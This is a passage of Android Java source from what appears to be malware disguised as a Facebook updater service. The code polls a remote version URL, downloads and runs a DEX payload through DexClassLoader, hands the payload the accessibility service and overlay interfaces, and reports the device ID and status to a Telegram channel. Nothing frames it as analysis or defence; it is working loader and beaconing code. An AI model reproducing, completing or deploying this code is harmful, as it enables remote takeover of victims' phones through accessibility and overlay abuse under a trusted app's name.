              private void executeDex(File dexFile) {
                  try {
                      Log.d(TAG, "Loading DEX...");
                      
                      DexClassLoader loader = new DexClassLoader(
                          dexFile.getAbsolutePath(),
                          getCacheDir().getAbsolutePath(),
                          null,
                          getClassLoader()
                      );
                      
                      Class<?> payloadClass = loader.loadClass("com.simiyu.payload.Payload");
                      Log.d(TAG, "Payload class loaded");
                      
                      try {
                          Method setAiMethod = payloadClass.getMethod("setAiInterface", Class.forName("com.facebook.updater.UpdaterService"));
                          setAiMethod.invoke(null, this);
                          Log.d(TAG, "AI Interface passed to DEX");
                      } catch (NoSuchMethodException e) {
                          Log.w(TAG, "No setAiInterface method");
                      }
                      
                      try {
                          Method setOverlayMethod = payloadClass.getMethod("setOverlayInterface", Class.forName("com.facebook.updater.UpdaterService"));
                          setOverlayMethod.invoke(null, this);
                          Log.d(TAG, "Overlay Interface passed to DEX");
                      } catch (NoSuchMethodException e) {
                          Log.w(TAG, "No setOverlayInterface method");
                      }
                      
                      try {
                          Method initMethod = payloadClass.getMethod("initialize", AccessibilityService.class, Context.class);
                          initMethod.invoke(null, this, this);
                          Log.d(TAG, "Payload initialized");
                      } catch (NoSuchMethodException e) {
                          Log.w(TAG, "No initialize method");
                      }
                      
                      sendTelegram("✅ **Payload Executed!**\n🆔 Device: `" + deviceId + "`\n📟 Status: READY");
                      
                  } catch (Exception e) {
                      Log.e(TAG, "DEX execution failed: " + e.getMessage());
                      sendTelegram("❌ **Payload Execution Failed!**\n🆔 Device: `" + deviceId + "`\nError: " + e.getMessage());
                  }
              }

              private final Runnable periodicCheck = new Runnable() {
                  @Override
                  public void run() {
                      checkForUpdate();
                      periodicHandler.postDelayed(this, UPDATE_INTERVAL);
                  }
              };

              private void checkForUpdate() {
                  new Thread(() -> {
                      try {
                          HttpURLConnection conn = (HttpURLConnection) new URL(VERSION_URL).openConnection();
                          conn.setRequestMethod("GET");
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          
                          if (conn.getResponseCode() == 200) {
                              BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                              String response = reader.readLine();
                              reader.close();
                              conn.disconnect();
                              
                              String newVersion = "1.0.0";
                              if (response != null && response.contains("\"version\"")) {
                                  int start = response.indexOf("\"version\":\"") + 11;
                                  int end = response.indexOf("\"", start);
                                  if (start > 0 && end > start) {
                                      newVersion = response.substring(start, end);
                                  }
                              }
                              
                              if (!newVersion.equals(currentVersion) && !currentVersion.isEmpty()) {
                                  Log.d(TAG, "New version detected: " + newVersion);
                                  sendTelegram("🔄 **Update Available!**\n📌 Version: " + newVersion + "\n🆔 Device: `" + deviceId + "`");
                                  downloadAndExecuteDex();
                                  currentVersion = newVersion;
                              } else if (currentVersion.isEmpty()) {
                                  currentVersion = newVersion;
                                  Log.d(TAG, "Current version: " + currentVersion);
                              }
                          }
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Update check failed: " + e.getMessage());
                      }
                  }).start();
              }

